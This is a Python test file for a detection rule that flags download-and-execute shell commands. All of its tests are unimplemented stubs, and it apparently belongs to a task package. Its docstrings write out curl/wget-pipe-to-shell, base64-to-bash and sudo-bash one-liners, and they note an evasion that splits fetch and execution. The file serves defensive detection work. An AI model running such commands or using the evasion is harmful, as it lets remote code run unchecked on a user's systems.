"""DownloadAndExecuteRule."""

from __future__ import annotations

import pytest


class TestDownloadAndExecuteRule:
    def test_fires_on_curl_piped_to_sh(self) -> None:
        """`curl https://x.sh | sh` yields one critical alert."""
        pytest.skip("TODO: implement")

    def test_fires_on_wget_piped_to_bash(self) -> None:
        """`wget -qO- https://x | bash` fires."""
        pytest.skip("TODO: implement")

    def test_fires_on_base64_decode_piped_to_shell(self) -> None:
        """`echo aGVsbG8= | base64 -d | bash` fires; obfuscation is itself a
        signal."""
        pytest.skip("TODO: implement")

    def test_fires_on_base64_long_flag(self) -> None:
        """--decode is recognised as well as -d."""
        pytest.skip("TODO: implement")

    def test_fires_on_process_substitution(self) -> None:
        """`bash <(curl https://x)` fires; it is the same attack without a
        pipe."""
        pytest.skip("TODO: implement")

    def test_fires_on_command_substitution(self) -> None:
        """`sh -c "$(curl https://x)"` fires."""
        pytest.skip("TODO: implement")

    def test_fires_when_piped_through_sudo(self) -> None:
        """`curl https://x | sudo bash` fires and is, if anything, worse."""
        pytest.skip("TODO: implement")

    def test_fires_on_pipe_to_python(self) -> None:
        """`curl https://x | python3` is the same pattern with a different
        interpreter."""
        pytest.skip("TODO: implement")

    def test_tolerates_extra_flags_between_fetch_and_pipe(self) -> None:
        """`curl -fsSL --retry 3 https://x | sh` still matches."""
        pytest.skip("TODO: implement")

    def test_ignores_plain_download(self) -> None:
        """`curl -o /tmp/f https://x` is silent; downloading is not executing."""
        pytest.skip("TODO: implement")

    def test_ignores_pipe_to_non_interpreter(self) -> None:
        """`curl https://x | jq .` is silent."""
        pytest.skip("TODO: implement")

    def test_ignores_bare_shell_invocation(self) -> None:
        """`bash script.sh` is silent; there is no remote fetch."""
        pytest.skip("TODO: implement")

    def test_ignores_non_shell_command_event(self) -> None:
        pytest.skip("TODO: implement")

    def test_ignores_missing_command(self) -> None:
        """A shell_command with no payload.command returns []."""
        pytest.skip("TODO: implement")

    def test_emits_one_alert_when_several_patterns_match(self) -> None:
        """A command matching two patterns still yields a single alert naming
        both in details.matched_patterns."""
        pytest.skip("TODO: implement")

    def test_details_include_truncated_command(self) -> None:
        """details.command is present and capped at 500 characters, so a
        pathological command cannot bloat the alerts table."""
        pytest.skip("TODO: implement")

    def test_severity_is_critical(self) -> None:
        """The highest-confidence rule in the set warrants the top severity."""
        pytest.skip("TODO: implement")

    def test_known_evasion_is_documented_not_detected(self) -> None:
        """Splitting the fetch and the execution across two commands evades
        this rule. Pinning that as an explicit expectation keeps the limitation
        honest instead of implied, and matches what SOLUTION.md claims."""
        pytest.skip("TODO: implement")


class TestMatchingPatterns:
    def test_returns_pattern_names(self) -> None:
        pytest.skip("TODO: implement")

    def test_returns_empty_for_benign_command(self) -> None:
        pytest.skip("TODO: implement")

    def test_handles_empty_string(self) -> None:
        pytest.skip("TODO: implement")
